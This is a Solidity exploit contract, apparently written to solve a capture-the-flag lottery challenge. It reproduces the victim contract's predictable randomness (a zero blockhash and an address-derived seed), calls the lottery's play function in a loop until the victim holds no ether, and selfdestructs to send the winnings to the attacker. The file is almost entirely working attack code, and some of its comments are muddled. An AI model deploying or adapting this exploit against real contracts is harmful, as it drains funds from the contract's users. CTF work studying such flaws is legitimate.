pragma solidity 0.4.24;

import "./Lottery.sol";

contract lotteryattack
{
    address public owner;
    address public victim_addr;
    
    constructor(address addr)
    {
        //Remember our wallet address
        owner=msg.sender;
        //Rememberthe victim contract
        victim_addr = addr;
    }
    
    function () payable {} //Ensure we can get paid (very important)
    
    function exploit() external payable
    {
        //Remember to authorize this exploit contract with the CtfFramework before running this exploit
        
        //First, we calculate the same entropy as the victim contract
        bytes32 entropy = blockhash(block.number); // = 0
        bytes32 target = keccak256(abi.encodePacked(keccak256(abi.encodePacked(address(this)))));
        bytes32 guess =  keccak256(abi.encodePacked(keccak256(abi.encodePacked(address(this)))));
        uint256 _seed = uint256(keccak256(abi.encodePacked(address(this))));
        
        //If I call the contract from an attacking contract, the value of msg.sender is the address of the attacking contract
        //the value of _seed that will make target = guess is (keccak256(abi.encodePacked(address(this))))
        //msg.sender conrresponds to my wallet's address.  No it is the same address that Lottery is expecting when it calculates the target. lottery is expecting the the address of the attacking contract (lotteryattack)
        
        //while the victim still has ether left 
        while(address(victim_addr).balance > 0)
        {
            //Send our guaranteed win
            Lottery(victim_addr).play.value(.001 ether)(_seed);
        }
        
        //Send ourselves the profits
        selfdestruct(owner);
    }
}
